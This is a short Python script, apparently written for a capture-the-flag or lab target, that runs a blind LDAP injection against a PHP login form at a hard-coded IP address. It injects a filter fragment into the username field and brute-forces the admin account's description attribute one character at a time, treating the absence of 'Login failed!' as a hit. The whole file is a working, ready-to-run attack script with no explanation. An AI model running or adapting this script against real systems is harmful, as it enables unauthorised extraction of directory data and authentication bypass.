import requests
from pathlib import Path
import sys


url = 'http://154.57.164.65:32040/index.php'
headers = {
    'Cookie': 'PHPSESSID=q7068n27113bgqhehciqn1244f',
    'Content-Type': 'application/x-www-form-urlencoded'
}
error_message = 'Login failed!'
tentativi = 3
characters_file = Path(__file__).resolve().parents[2] / "shared" / "caratteri_tastiera.txt"

def find_character(pre_data, post_data):
    with characters_file.open("r", encoding="utf-8") as file_obj:
        for line in file_obj:
            character = line.rstrip("\r\n")
            if not character: continue

            data = pre_data + character + post_data
            # print(f"Data sended: {data}")
            try:
                response = requests.post(
                    url,
                    data=data,
                    headers=headers,
                    stream=True,
                )
                response_body = response.text
                # print(f"Response body:\n{response_body}")
                
                if error_message in response_body: continue
                
                return character

            except requests.exceptions.RequestException as exc:
                print(
                    f"\r\nErrore request: {exc}",
                    end="\r\n",
                    flush=True,
                )
                return False

def run_cli():
    try:
        #username=admin)(|(description=a*&password=invalid)
        pre_data = 'username=admin)(|(description='
        post_data = '*&password=invalid)'
        characters = []
        while True:
            p_data = pre_data + ''.join(characters)
            character = find_character(p_data, post_data)

            if not character:
                if len(characters) == 0:
                    print("Non è stato trovato nessun carattere !")
                return
            
            print(character, end="", flush=True)
            sys.stdout.flush()
            characters.append(character)
        
    except OSError as exception_obj:
        print(f"Errore durante il caricamento del file '{characters_file}': {exception_obj}")
        return []


if __name__ == "__main__":
    run_cli()
